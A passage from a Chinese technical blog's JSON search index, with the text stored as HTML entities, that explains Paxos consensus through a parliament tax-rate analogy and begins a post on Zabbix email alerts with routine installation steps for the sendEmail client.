A5&#x51B3;&#x5B9A;&#x5C06;&#x7A0E;&#x7387;&#x5B9A;&#x4E3A;20%:1&#x73B0;&#x6709;&#x7684;&#x7A0E;&#x7387;&#x662F;&#x4EC0;&#x4E48;?&#x5982;&#x679C;&#x6CA1;&#x6709;&#x51B3;&#x5B9A;&#xFF0C;&#x5219;&#x5EFA;&#x8BAE;&#x5C06;&#x5176;&#x5B9A;&#x4E3A;20%.&#x65F6;&#x95F4;&#xFF1A;&#x672C;&#x5C4A;&#x8BAE;&#x4F1A;&#x7B2C;3&#x5E74;3&#x6708;15&#x65E5;;&#x63D0;&#x6848;&#x8005;&#xFF1A;A5 &#x8349;&#x6848;&#x8981;&#x901A;&#x8FC7;&#x4F8D;&#x4ECE;&#x9001;&#x5230;&#x5176;&#x5B83;&#x8BAE;&#x5458;&#x7684;&#x6848;&#x5934;. A1&#x7684;&#x8349;&#x6848;&#x5C06;&#x7531;4&#x4F4D;&#x4F8D;&#x4ECE;&#x9001;&#x5230;A2-A5&#x90A3;&#x91CC;&#x3002;&#x73B0;&#x5728;&#xFF0C;&#x8D1F;&#x8D23;A2&#x548C;A3&#x7684;&#x4F8D;&#x4ECE;&#x5C06;&#x8349;&#x6848;&#x987A;&#x5229;&#x9001;&#x8FBE;&#xFF0C;&#x8D1F;&#x8D23;A4&#x548C;A5&#x7684;&#x4F8D;&#x4ECE;&#x5219;&#x4E0D;&#x4E0A;&#x73ED;. A5&#x7684;&#x8349;&#x6848;&#x5219;&#x987A;&#x5229;&#x7684;&#x9001;&#x81F3;A3&#x548C;A4&#x624B;&#x4E2D;&#x3002; &#x73B0;&#x5728;, A1, A2, A3&#x6536;&#x5230;&#x4E86;A1&#x7684;&#x63D0;&#x6848;; A3, A4, A5&#x6536;&#x5230;&#x4E86;A5&#x7684;&#x63D0;&#x6848;&#x3002;&#x6309;&#x7167;&#x534F;&#x8BAE;, A1, A2, A4, A5&#x5C06;&#x63A5;&#x53D7;&#x4ED6;&#x4EEC;&#x6536;&#x5230;&#x7684;&#x63D0;&#x6848;&#xFF0C;&#x4F8D;&#x4ECE;&#x5C06;&#x62FF;&#x7740;1&#x6211;&#x5DF2;&#x6536;&#x5230;&#x4F60;&#x7684;&#x63D0;&#x6848;&#xFF0C;&#x7B49;&#x5F85;&#x6700;&#x7EC8;&#x6279;&#x51C6; &#x7684;&#x56DE;&#x590D;&#x56DE;&#x5230;&#x63D0;&#x6848;&#x8005;&#x90A3;&#x91CC;&#x3002;&#x800C;A3&#x7684;&#x884C;&#x4E3A;&#x5C06;&#x51B3;&#x5B9A;&#x6279;&#x51C6;&#x54EA;&#x4E00;&#x4E2A;&#x3002; &#x60C5;&#x51B5;&#x4E00;&#x5047;&#x8BBE;A1&#x7684;&#x63D0;&#x6848;&#x5148;&#x9001;&#x5230;A3&#x5904;&#xFF0C;&#x800C;A5&#x7684;&#x4F8D;&#x4ECE;&#x51B3;&#x5B9A;&#x653E;&#x5047;&#x4E00;&#x6BB5;&#x65F6;&#x95F4;&#x3002;&#x4E8E;&#x662F;A3&#x63A5;&#x53D7;&#x5E76;&#x6D3E;&#x51FA;&#x4E86;&#x4F8D;&#x4ECE;. A1&#x7B49;&#x5230;&#x4E86;&#x4E24;&#x4F4D;&#x4F8D;&#x4ECE;&#xFF0C;&#x52A0;&#x4E0A;&#x5B83;&#x81EA;&#x5DF1;&#x5DF2;&#x7ECF;&#x6784;&#x6210;&#x4E00;&#x4E2A;&#x591A;&#x6570;&#x6D3E;&#xFF0C;&#x4E8E;&#x662F;&#x7A0E;&#x7387;10%&#x5C06;&#x6210;&#x4E3A;&#x51B3;&#x8BAE;. A1&#x6D3E;&#x51FA;&#x4F8D;&#x4ECE;&#x5C06;&#x51B3;&#x8BAE;&#x9001;&#x5230;&#x6240;&#x6709;&#x8BAE;&#x5458;&#x5904;&#xFF1A;1&#x7A0E;&#x7387;&#x5DF2;&#x5B9A;&#x4E3A;10%,&#x65B0;&#x7684;&#x63D0;&#x6848;&#x4E0D;&#x5F97;&#x518D;&#x8BA8;&#x8BBA;&#x672C;&#x95EE;&#x9898;&#x3002; A3&#x5728;&#x5F88;&#x4E45;&#x4EE5;&#x540E;&#x6536;&#x5230;&#x4E86;&#x6765;&#x81EA;A5&#x7684;&#x63D0;&#x6848;&#x3002;&#x7531;&#x4E8E;&#x7A0E;&#x7387;&#x95EE;&#x9898;&#x5DF2;&#x7ECF;&#x8BA8;&#x8BBA;&#x5B8C;&#x6BD5;&#xFF0C;&#x4ED6;&#x51B3;&#x5B9A;&#x4E0D;&#x518D;&#x7406;&#x4F1A;&#x3002;&#x4F46;&#x662F;&#x4ED6;&#x8981;&#x62B1;&#x6028;&#x4E00;&#x53E5;&#xFF1A;1&#x7A0E;&#x7387;&#x5DF2;&#x5728;&#x4E4B;&#x524D;&#x7684;&#x6295;&#x7968;&#x4E2D;&#x5B9A;&#x4E3A;10%,&#x4F60;&#x4E0D;&#x8981;&#x518D;&#x6765;&#x70E6;&#x6211;! &#x8FD9;&#x4E2A;&#x56DE;&#x590D;&#x5BF9;A5&#x53EF;&#x80FD;&#x6709;&#x5E2E;&#x52A9;&#xFF0C;&#x56E0;&#x4E3A;A5&#x53EF;&#x80FD;&#x56E0;&#x4E3A;&#x67D0;&#x79CD;&#x539F;&#x56E0;&#x5F88;&#x4E45;&#x65E0;&#x6CD5;&#x4E0E;&#x4E0E;&#x5916;&#x754C;&#x8054;&#x7CFB;&#x4E86;&#x3002;&#x5F53;&#x7136;&#x66F4;&#x53EF;&#x80FD;&#x5BF9;A5&#x6CA1;&#x6709;&#x4EFB;&#x4F55;&#x4F5C;&#x7528;&#xFF0C;&#x56E0;&#x4E3A;A5&#x53EF;&#x80FD;&#x5DF2;&#x7ECF;&#x4ECE;A1&#x5904;&#x83B7;&#x5F97;&#x4E86;&#x521A;&#x624D;&#x7684;&#x51B3;&#x8BAE;&#x3002; &#x60C5;&#x51B5;&#x4E8C;&#x4F9D;&#x7136;&#x5047;&#x8BBE;A1&#x7684;&#x63D0;&#x6848;&#x5148;&#x9001;&#x5230;A3&#x5904;&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x6B21;A5&#x7684;&#x4F8D;&#x4ECE;&#x4E0D;&#x662F;&#x653E;&#x5047;&#x4E86;&#xFF0C;&#x53EA;&#x662F;&#x4E2D;&#x9014;&#x803D;&#x6401;&#x4E86;&#x4E00;&#x4F1A;&#x3002;&#x8FD9;&#x6B21;, A3&#x4F9D;&#x7136;&#x4F1A;&#x5C06;&#x201D;&#x63A5;&#x53D7;&#x201D;&#x56DE;&#x590D;&#x7ED9;A1.&#x4F46;&#x662F;&#x5728;&#x51B3;&#x8BAE;&#x6210;&#x578B;&#x4E4B;&#x524D;&#x5B83;&#x53C8;&#x6536;&#x5230;&#x4E86;A5&#x7684;&#x63D0;&#x6848;&#x3002;&#x8FD9;&#x65F6;&#x534F;&#x8BAE;&#x6709;&#x4E24;&#x79CD;&#x5904;&#x7406;&#x65B9;&#x5F0F;&#xFF1A;1.&#x5982;&#x679C;A5&#x7684;&#x63D0;&#x6848;&#x66F4;&#x65E9;&#xFF0C;&#x6309;&#x7167;&#x4F20;&#x7EDF;&#x5E94;&#x8BE5;&#x7531;&#x8F83;&#x65E9;&#x7684;&#x63D0;&#x6848;&#x8005;&#x4E3B;&#x6301;&#x6295;&#x7968;&#x3002;&#x73B0;&#x5728;&#x770B;&#x6765;&#x4E24;&#x4EFD;&#x63D0;&#x6848;&#x7684;&#x65F6;&#x95F4;&#x4E00;&#x6837;&#xFF08;&#x672C;&#x5C4A;&#x8BAE;&#x4F1A;&#x7B2C;3&#x5E74;3&#x6708;15&#x65E5;&#xFF09;&#x3002;&#x4F46;&#x662F;A5&#x662F;&#x4E2A;&#x60F9;&#x4E0D;&#x8D77;&#x7684;&#x5927;&#x4EBA;&#x7269;&#x3002;&#x4E8E;&#x662F;A3&#x56DE;&#x590D;&#xFF1A;1&#x6211;&#x5DF2;&#x6536;&#x5230;&#x60A8;&#x7684;&#x63D0;&#x6848;&#xFF0C;&#x7B49;&#x5F85;&#x6700;&#x7EC8;&#x6279;&#x51C6;&#xFF0C;&#x4F46;&#x662F;&#x60A8;&#x4E4B;&#x524D;&#x6709;&#x4EBA;&#x63D0;&#x51FA;&#x5C06;&#x7A0E;&#x7387;&#x5B9A;&#x4E3A;10%,&#x8BF7;&#x660E;&#x5BDF;&#x3002; &#x4E8E;&#x662F;, A1&#x548C;A5&#x90FD;&#x6536;&#x5230;&#x4E86;&#x8DB3;&#x591F;&#x7684;&#x56DE;&#x590D;&#x3002;&#x8FD9;&#x65F6;&#x5173;&#x4E8E;&#x7A0E;&#x7387;&#x95EE;&#x9898;&#x5C31;&#x6709;&#x4E24;&#x4E2A;&#x63D0;&#x6848;&#x5728;&#x540C;&#x65F6;&#x8FDB;&#x884C;&#x3002;&#x4F46;&#x662F;A5&#x77E5;&#x9053;&#x4E4B;&#x524D;&#x6709;&#x4EBA;&#x63D0;&#x51FA;&#x7A0E;&#x7387;&#x4E3A;10%.&#x4E8E;&#x662F;A1&#x548C;A5&#x90FD;&#x4F1A;&#x5411;&#x5168;&#x4F53;&#x8BAE;&#x5458;&#x5E7F;&#x64AD;&#xFF1A;1&#x7A0E;&#x7387;&#x5DF2;&#x5B9A;&#x4E3A;10%,&#x65B0;&#x7684;&#x63D0;&#x6848;&#x4E0D;&#x5F97;&#x518D;&#x8BA8;&#x8BBA;&#x672C;&#x95EE;&#x9898;&#x3002; &#x4E00;&#x81F4;&#x6027;&#x5F97;&#x5230;&#x4E86;&#x4FDD;&#x8BC1;&#x3002; A5&#x662F;&#x4E2A;&#x65E0;&#x8DB3;&#x8F7B;&#x91CD;&#x7684;&#x5C0F;&#x4EBA;&#x7269;&#x3002;&#x8FD9;&#x65F6;A3&#x4E0D;&#x518D;&#x7406;&#x4F1A;&#x4ED6;, A1&#x4E0D;&#x4E45;&#x540E;&#x5C31;&#x4F1A;&#x5E7F;&#x64AD;&#x7A0E;&#x7387;&#x5B9A;&#x4E3A;10%. &#x60C5;&#x51B5;&#x4E09;&#x5728;&#x8FD9;&#x4E2A;&#x60C5;&#x51B5;&#x4E2D;&#xFF0C;&#x6211;&#x4EEC;&#x5C06;&#x770B;&#x89C1;&#xFF0C;&#x6839;&#x636E;&#x63D0;&#x6848;&#x7684;&#x65F6;&#x95F4;&#x53CA;&#x63D0;&#x6848;&#x8005;&#x7684;&#x6743;&#x52BF;&#x51B3;&#x5B9A;&#x662F;&#x5426;&#x5E94;&#x7B54;&#x662F;&#x6709;&#x610F;&#x4E49;&#x7684;&#x3002;&#x5728;&#x8FD9;&#x91CC;&#xFF0C;&#x65F6;&#x95F4;&#x548C;&#x63D0;&#x6848;&#x8005;&#x7684;&#x6743;&#x52BF;&#x5C31;&#x6784;&#x6210;&#x4E86;&#x7ED9;&#x63D0;&#x6848;&#x7F16;&#x53F7;&#x7684;&#x4F9D;&#x636E;&#x3002;&#x8FD9;&#x6837;&#x7684;&#x7F16;&#x53F7;&#x7B26;&#x5408;&#x201D;&#x4EFB;&#x4F55;&#x4E24;&#x4E2A;&#x63D0;&#x6848;&#x4E4B;&#x95F4;&#x6784;&#x6210;&#x504F;&#x5E8F;&#x201D;&#x7684;&#x8981;&#x6C42;&#x3002; A1&#x548C;A5&#x540C;&#x6837;&#x63D0;&#x51FA;&#x4E0A;&#x8FF0;&#x63D0;&#x6848;&#xFF0C;&#x8FD9;&#x65F6;A1&#x53EF;&#x4EE5;&#x6B63;&#x5E38;&#x8054;&#x7CFB;A2&#x548C;A3; A5&#x4E5F;&#x53EF;&#x4EE5;&#x6B63;&#x5E38;&#x8054;&#x7CFB;&#x8FD9;&#x4E24;&#x4E2A;&#x4EBA;&#x3002;&#x8FD9;&#x6B21;A2&#x5148;&#x6536;&#x5230;A1&#x7684;&#x63D0;&#x6848;; A3&#x5219;&#x5148;&#x6536;&#x5230;A5&#x7684;&#x63D0;&#x6848;. A5&#x66F4;&#x6709;&#x6743;&#x52BF;&#x3002; &#x5728;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;&#x5DF2;&#x7ECF;&#x56DE;&#x7B54;A1&#x7684;A2&#x53D1;&#x73B0;&#x6709;&#x6BD4;A1&#x66F4;&#x6709;&#x6743;&#x52BF;&#x7684;A5&#x63D0;&#x51FA;&#x4E86;&#x7A0E;&#x7387;20%&#x7684;&#x65B0;&#x63D0;&#x6848;&#xFF0C;&#x4E8E;&#x662F;&#x56DE;&#x590D;A5&#x8BF4;&#xFF1A;1&#x6211;&#x5DF2;&#x6536;&#x5230;&#x60A8;&#x7684;&#x63D0;&#x6848;&#xFF0C;&#x7B49;&#x5F85;&#x6700;&#x7EC8;&#x6279;&#x51C6;&#x3002; &#x800C;&#x56DE;&#x590D;&#x4E86;A5&#x7684;A3&#x53D1;&#x73B0;&#x65B0;&#x7684;&#x63D0;&#x6848;&#x8005;A1&#x662F;&#x4E2A;&#x5C0F;&#x4EBA;&#x7269;&#xFF0C;&#x4E0D;&#x4E88;&#x7406;&#x4F1A;&#x3002; A1&#x6CA1;&#x6709;&#x8FBE;&#x5230;&#x591A;&#x6570;&#xFF0C;A5&#x8FBE;&#x5230;&#x4E86;&#xFF0C;&#x4E8E;&#x662F;A5&#x5C06;&#x4E3B;&#x6301;&#x6295;&#x7968;&#xFF0C;&#x51B3;&#x8BAE;&#x7684;&#x5185;&#x5BB9;&#x662F;A5&#x63D0;&#x51FA;&#x7684;&#x7A0E;&#x7387;20%. &#x5982;&#x679C;A3&#x51B3;&#x5B9A;&#x5E73;&#x7B49;&#x5730;&#x5BF9;&#x5F85;&#x6BCF;&#x4E00;&#x4F4D;&#x8BAE;&#x5458;&#xFF0C;&#x5BF9;A1&#x505A;&#x51FA;&#x201D;&#x4F60;&#x4E4B;&#x524D;&#x6709;&#x4EBA;&#x63D0;&#x51FA;&#x5C06;&#x7A0E;&#x7387;&#x5B9A;&#x4E3A;20%&#x201D;&#x7684;&#x56DE;&#x590D;&#xFF0C;&#x5219;&#x5C06;&#x9020;&#x6210;&#x6DF7;&#x4E71;&#x3002;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;A1&#x548C;A5&#x90FD;&#x5C06;&#x8BD5;&#x56FE;&#x4E3B;&#x6301;&#x6295;&#x7968;&#xFF0C;&#x4F46;&#x662F;&#x8FD9;&#x6B21;&#x4E24;&#x4EFD;&#x63D0;&#x6848;&#x7684;&#x5185;&#x5BB9;&#x4E0D;&#x540C;&#x3002; &#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;, A3&#x82E5;&#x5BF9;A1&#x8FDB;&#x884C;&#x56DE;&#x590D;&#xFF0C;&#x53EA;&#x80FD;&#x8BF4;&#xFF1A;1&#x6709;&#x66F4;&#x5927;&#x7684;&#x4EBA;&#x7269;&#x5173;&#x6CE8;&#x6B64;&#x4E8B;&#xFF0C;&#x8BF7;&#x7B49;&#x5F85;&#x4ED6;&#x505A;&#x51FA;&#x51B3;&#x5B9A;&#x3002; &#x53E6;&#x5916;&#xFF0C;&#x5728;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;, A4&#x4E0E;&#x5916;&#x754C;&#x5931;&#x53BB;&#x4E86;&#x8054;&#x7CFB;&#x3002;&#x7B49;&#x5230;&#x4ED6;&#x6062;&#x590D;&#x8054;&#x7CFB;&#xFF0C;&#x5E76;&#x9700;&#x8981;&#x5F97;&#x77E5;&#x7A0E;&#x7387;&#x60C5;&#x51B5;&#x65F6;&#xFF0C;&#x4ED6;&#xFF08;&#x5728;&#x6700;&#x7B80;&#x5355;&#x7684;&#x534F;&#x8BAE;&#x4E2D;&#xFF09;&#x5C06;&#x63D0;&#x51FA;&#x4E00;&#x4E2A;&#x63D0;&#x6848;&#xFF1A;1&#x73B0;&#x6709;&#x7684;&#x7A0E;&#x7387;&#x662F;&#x4EC0;&#x4E48;?&#x5982;&#x679C;&#x6CA1;&#x6709;&#x51B3;&#x5B9A;&#xFF0C;&#x5219;&#x5EFA;&#x8BAE;&#x5C06;&#x5176;&#x5B9A;&#x4E3A;15%.&#x65F6;&#x95F4;&#xFF1A;&#x672C;&#x5C4A;&#x8BAE;&#x4F1A;&#x7B2C;3&#x5E74;4&#x6708;1&#x65E5;;&#x63D0;&#x6848;&#x8005;&#xFF1A;A4 &#x8FD9;&#x65F6;&#xFF0C;&#xFF08;&#x5728;&#x6700;&#x7B80;&#x5355;&#x7684;&#x534F;&#x8BAE;&#x4E2D;&#xFF09;&#x5176;&#x4ED6;&#x8BAE;&#x5458;&#x5C06;&#x4F1A;&#x56DE;&#x590D;&#xFF1A;1&#x7A0E;&#x7387;&#x5DF2;&#x5728;&#x4E4B;&#x524D;&#x7684;&#x6295;&#x7968;&#x4E2D;&#x5B9A;&#x4E3A;20%,&#x4F60;&#x4E0D;&#x8981;&#x518D;&#x6765;&#x70E6;&#x6211;! &#x51B3;&#x8BAE;&#x7684;&#x53D1;&#x5E03;&#x4E00;&#x4E2A;&#x663E;&#x800C;&#x6613;&#x89C1;&#x7684;&#x65B9;&#x6CD5;&#x662F;&#x5F53;acceptors&#x6279;&#x51C6;&#x4E00;&#x4E2A;value&#x65F6;&#xFF0C;&#x5C06;&#x8FD9;&#x4E2A;&#x6D88;&#x606F;&#x53D1;&#x9001;&#x7ED9;&#x6240;&#x6709;learner&#x3002;&#x4F46;&#x662F;&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#x4F1A;&#x5BFC;&#x81F4;&#x6D88;&#x606F;&#x91CF;&#x8FC7;&#x5927;&#x3002;&#x7531;&#x4E8E;&#x5047;&#x8BBE;&#x6CA1;&#x6709;Byzantine failures&#xFF0C;learners&#x53EF;&#x4EE5;&#x901A;&#x8FC7;&#x522B;&#x7684;learners&#x83B7;&#x53D6;&#x5DF2;&#x7ECF;&#x901A;&#x8FC7;&#x7684;&#x51B3;&#x8BAE;&#x3002;&#x56E0;&#x6B64;acceptors&#x53EA;&#x9700;&#x5C06;&#x6279;&#x51C6;&#x7684;&#x6D88;&#x606F;&#x53D1;&#x9001;&#x7ED9;&#x6307;&#x5B9A;&#x7684;&#x67D0;&#x4E00;&#x4E2A;learner&#xFF0C;&#x5176;&#x4ED6;learners&#x5411;&#x5B83;&#x8BE2;&#x95EE;&#x5DF2;&#x7ECF;&#x901A;&#x8FC7;&#x7684;&#x51B3;&#x8BAE;&#x3002;&#x8FD9;&#x4E2A;&#x65B9;&#x6CD5;&#x964D;&#x4F4E;&#x4E86;&#x6D88;&#x606F;&#x91CF;&#xFF0C;&#x4F46;&#x662F;&#x6307;&#x5B9A;learner&#x5931;&#x6548;&#x5C06;&#x5F15;&#x8D77;&#x7CFB;&#x7EDF;&#x5931;&#x6548;&#x3002; &#x56E0;&#x6B64;acceptors&#x9700;&#x8981;&#x5C06;accept&#x6D88;&#x606F;&#x53D1;&#x9001;&#x7ED9;learners&#x7684;&#x4E00;&#x4E2A;&#x5B50;&#x96C6;&#xFF0C;&#x7136;&#x540E;&#x7531;&#x8FD9;&#x4E9B;learners&#x53BB;&#x901A;&#x77E5;&#x6240;&#x6709;learners&#x3002;&#x4F46;&#x662F;&#x7531;&#x4E8E;&#x6D88;&#x606F;&#x4F20;&#x9012;&#x7684;&#x4E0D;&#x786E;&#x5B9A;&#x6027;&#xFF0C;&#x53EF;&#x80FD;&#x4F1A;&#x6CA1;&#x6709;&#x4EFB;&#x4F55;learner&#x83B7;&#x5F97;&#x4E86;&#x51B3;&#x8BAE;&#x6279;&#x51C6;&#x7684;&#x6D88;&#x606F;&#x3002;&#x5F53;learners&#x9700;&#x8981;&#x4E86;&#x89E3;&#x51B3;&#x8BAE;&#x901A;&#x8FC7;&#x60C5;&#x51B5;&#x65F6;&#xFF0C;&#x53EF;&#x4EE5;&#x8BA9;&#x4E00;&#x4E2A;proposer&#x91CD;&#x65B0;&#x8FDB;&#x884C;&#x4E00;&#x6B21;&#x63D0;&#x6848;&#x3002;&#x6CE8;&#x610F;&#x4E00;&#x4E2A;learner&#x53EF;&#x80FD;&#x517C;&#x4EFB;proposer&#x3002; Progress&#x7684;&#x4FDD;&#x8BC1;&#x6839;&#x636E;&#x4E0A;&#x8FF0;&#x8FC7;&#x7A0B;&#x5F53;&#x4E00;&#x4E2A;proposer&#x53D1;&#x73B0;&#x5B58;&#x5728;&#x7F16;&#x53F7;&#x66F4;&#x5927;&#x7684;&#x63D0;&#x6848;&#x65F6;&#x5C06;&#x7EC8;&#x6B62;&#x63D0;&#x6848;&#x3002;&#x8FD9;&#x610F;&#x5473;&#x7740;&#x63D0;&#x51FA;&#x4E00;&#x4E2A;&#x7F16;&#x53F7;&#x66F4;&#x5927;&#x7684;&#x63D0;&#x6848;&#x4F1A;&#x7EC8;&#x6B62;&#x4E4B;&#x524D;&#x7684;&#x63D0;&#x6848;&#x8FC7;&#x7A0B;&#x3002;&#x5982;&#x679C;&#x4E24;&#x4E2A;proposer&#x5728;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#x90FD;&#x8F6C;&#x800C;&#x63D0;&#x51FA;&#x4E00;&#x4E2A;&#x7F16;&#x53F7;&#x66F4;&#x5927;&#x7684;&#x63D0;&#x6848;&#xFF0C;&#x5C31;&#x53EF;&#x80FD;&#x9677;&#x5165;&#x6D3B;&#x9501;&#xFF0C;&#x8FDD;&#x80CC;&#x4E86;Progress&#x7684;&#x8981;&#x6C42;&#x3002;&#x8FD9;&#x79CD;&#x60C5;&#x51B5;&#x4E0B;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#x662F;&#x9009;&#x4E3E;&#x51FA;&#x4E00;&#x4E2A;leader&#xFF0C;&#x4EC5;&#x5141;&#x8BB8;leader&#x63D0;&#x51FA;&#x63D0;&#x6848;&#x3002;&#x4F46;&#x662F;&#x7531;&#x4E8E;&#x6D88;&#x606F;&#x4F20;&#x9012;&#x7684;&#x4E0D;&#x786E;&#x5B9A;&#x6027;&#xFF0C;&#x53EF;&#x80FD;&#x6709;&#x591A;&#x4E2A;proposer&#x81EA;&#x8BA4;&#x4E3A;&#x81EA;&#x5DF1;&#x5DF2;&#x7ECF;&#x6210;&#x4E3A;leader&#x3002;Lamport&#x5728;The Part-Time Parliament&#x4E00;&#x6587;&#x4E2D;&#x63CF;&#x8FF0;&#x5E76;&#x89E3;&#x51B3;&#x4E86;&#x8FD9;&#x4E2A;&#x95EE;&#x9898;&#x3002;","raw":null,"content":null,"categories":[{"name":"算法及理论","slug":"算法及理论","permalink":"http://www.wangxin123.com/categories/算法及理论/"}],"tags":[{"name":"分布式算法","slug":"分布式算法","permalink":"http://www.wangxin123.com/tags/分布式算法/"}]},{"title":"zabbix邮件报警","slug":"zabbix邮件报警","date":"2016-11-01T10:53:00.000Z","updated":"2016-11-21T03:57:10.574Z","comments":true,"path":"2016/11/01/zabbix邮件报警/","link":"","permalink":"http://www.wangxin123.com/2016/11/01/zabbix邮件报警/","excerpt":"&#x793A;&#x8B66;&#x5A92;&#x4ECB;&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;zabbix&#x76D1;&#x63A7;&#x4E3B;&#x673A;&#x90FD;&#x914D;&#x7F6E;&#x4E86;&#x89E6;&#x53D1;&#x5668;&#xFF0C;&#x89E6;&#x53D1;&#x5668;&#x88AB;&#x89E6;&#x53D1;&#x53D1;&#x9001;&#x6D88;&#x606F;&#x7ED9;&#x8FD0;&#x7EF4;&#xFF0C;&#x9700;&#x8981;&#x4E2D;&#x95F4;&#x4ECB;&#x8D28;&#x6765;&#x63A5;&#x6536;&#x5E76;&#x4F20;&#x9012;&#x6D88;&#x606F;&#x3002; zabbix&#x9ED8;&#x8BA4;&#x7684;&#x3010;&#x793A;&#x8B66;&#x5A92;&#x4ECB;&#x7C7B;&#x578B;&#x3011;&#x6709;&#x4E09;&#x79CD;&#xFF0C;Email&#x3001;Jabber&#x3001;SMS&#x3002;&#xFF08;1&#xFF09;Email&#xFF1A;&#x4F7F;&#x7528;sendmail&#x53D1;&#x9001;&#x90AE;&#x4EF6;&#xFF0C;&#x4ECE;&#x8FD9;&#x8FB9;&#x51FA;&#x53BB;&#x7684;&#x90AE;&#x4EF6;&#x57FA;&#x672C;&#x662F;&#x5783;&#x573E;&#x90AE;&#x4EF6;&#x3002;&#xFF08;2&#xFF09;SMS&#xFF1A;&#x9700;&#x8981;&#x77ED;&#x4FE1;&#x8BBE;&#x5907;&#xFF0C;&#x6CA1;&#x6709;&#xFF0C;&#x6240;&#x4EE5;&#x6CA1;&#x7528;&#x8FC7;&#x8FD9;&#x4E1C;&#x897F;&#xFF08;3&#xFF09;Jabber:Jabber&#x6709;&#x7B2C;&#x4E09;&#x65B9;&#x63D2;&#x4EF6;&#xFF0C;&#x80FD;&#x8BA9;Jabber&#x7528;&#x6237;&#x548C;MSN&#x3001;YahooMessager&#x3001;ICQ&#x7B49;IM&#x7528;&#x6237;&#x76F8;&#x4E92;&#x901A;&#x8BAF;&#x3002;&#x56E0;&#x4E3A;Google&#x9075;&#x4ECE;Jabber&#x534F;&#x8BAE;&#xFF0C;&#x5E76;&#x4E14;Google&#x5DF2;&#x7ECF;&#x5C06;Gtalk&#x7684;&#x670D;&#x52A1;&#x5668;&#x5F00;&#x653E;&#x7ED9;&#x4E86;&#x5176;&#x5B83;&#x7684;Jabber&#x670D;&#x52A1;&#x5668;&#x3002;&#x6240;&#x4EE5;PSI&#x3001;Giam&#x7B49;Jabber&#x5BA2;&#x6237;&#x7AEF;&#x8F6F;&#x4EF6;&#x652F;&#x6301;GTalk&#x7528;&#x6237;&#x767B;&#x9646;&#x3002;&#x56FD;&#x5185;&#x6CA1;&#x5565;&#x4EBA;&#x7528;&#x3002; sendEmail&#x662F;&#x4E00;&#x4E2A;&#x8F7B;&#x91CF;&#x7EA7;&#xFF0C;&#x547D;&#x4EE4;&#x884C;&#x7684;SMTP&#x90AE;&#x4EF6;&#x5BA2;&#x6237;&#x7AEF;&#x3002;&#x5982;&#x679C;&#x9700;&#x8981;&#x4F7F;&#x7528;&#x547D;&#x4EE4;&#x884C;&#x53D1;&#x9001;&#x90AE;&#x4EF6;&#xFF0C;&#x90A3;&#x4E48;sendEmail&#x662F;&#x4E0D;&#x9519;&#x7684;&#x9009;&#x62E9;&#x3002;sendEmail&#x4F7F;&#x7528;&#x7B80;&#x5355;&#x5E76;&#x4E14;&#x529F;&#x80FD;&#x5F3A;&#x5927;&#x3002;&#x8FD9;&#x4E2A;&#x88AB;&#x8BBE;&#x8BA1;&#x7528;&#x5728;php&#x3001;perl&#x548C;web&#x7AD9;&#x70B9;&#x4F7F;&#x7528;&#x3002;&#x8BF7;&#x6CE8;&#x610F;&#xFF0C;&#x4E0D;&#x662F;sendmail&#x3002; sendEmail&#x5B89;&#x88C5;12345678910111213# &#x4E0B;&#x8F7D;&#x8F6F;&#x4EF6;wget http://caspian.dotconf.net/menu/Software/SendEmail/sendEmail-v1.56.tar.gz# &#x89E3;&#x538B;&#x8F6F;&#x4EF6;# tar zxvf sendEmail-v1.56.tar.gz# &#x8FDB;&#x5165;&#x76EE;&#x5F55;cd /usr/src/sendEmail-v1.56# &#x521B;&#x5EFA;&#x76EE;&#x5F55;mkdir /usr/local/bin# &#x590D;&#x5236;&#x6587;&#x4EF6;&#xFF0C;&#x5E76;&#x8BBE;&#x7F6E;&#x6743;&#x9650;cp -a sendEmail /usr/local/binchmod +x /usr/local/bin/sendEmail# &#x5B89;&#x88C5;&#x7EC4;&#x4EF6;yum install perl-Net-SSLeay perl-IO-Socket-SSL -y","keywords":null,"text":"&#x793A;&#x8B66;&#x5A92;&#x4ECB;&#x4E00;&#x822C;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;zabbix&#x76D1;&#x63A7;&#x4E3B;&#x673A;&#x90FD;&#x914D;&#x7F6E;&#x4E86;&#x89E6;&#x53D1;&#x5668;&#xFF0C;&#x89E6;&#x53D1;&#x5668;&#x88AB;&#x89E6;&#x53D1;&#x53D1;&#x9001;&#x6D88;&#x606F;&#x7ED9;&#x8FD0;&#x7EF4;&#xFF0C;&#x9700;&#x8981;&#x4E2D;&#x95F4;&#x4ECB;&#x8D28;&#x6765;&#x63A5;&#x6536;&#x5E76;&#x4F20;&#x9012;&#x6D88;&#x606F;&#x3002; zabbix&#x9ED8;&#x8BA4;&#x7684;&#x3010;&#x793A;&#x8B66;&#x5A92;&#x4ECB;&#x7C7B;&#x578B;&#x3011;&#x6709;&#x4E09;&#x79CD;&#xFF0C;Email&#x3001;Jabber&#x3001;SMS&#x3002;&#xFF08;1&#xFF09;Email&#xFF1A;&#x4F7F;&#x7528;sendmail&#x53D1;&#x9001;&#x90AE;&#x4EF6;&#xFF0C;&#x4ECE;&#x8FD9;&#x8FB9;&#x51FA;&#x53BB;&#x7684;&#x90AE;&#x4EF6;&#x57FA;&#x672C;&#x662F;&#x5783;&#x573E;&#x90AE;&#x4EF6;&#x3002;&#xFF08;2&#xFF09;SMS&#xFF1A;&#x9700;&#x8981;&#x77ED;&#x4FE1;&#x8BBE;&#x5907;&#xFF0C;&#x6CA1;&#x6709;&#xFF0C;&#x6240;&#x4EE5;&#x6CA1;&#x7528;&#x8FC7;&#x8FD9;&#x4E1C;&#x897F;&#xFF08;3&#xFF09;Jabber:Jabber&#x6709;&#x7B2C;&#x4E09;&#x65B9;&#x63D2;&#x4EF6;&#xFF0C;&#x80FD;&#x8BA9;Jabber&#x7528;&#x6237;&#x548C;MSN&#x3001;YahooMessager&#x3001;ICQ&#x7B49;IM&#x7528;&#x6237;&#x76F8;&#x4E92;&#x901A;&#x8BAF;&#x3002;&#x56E0;&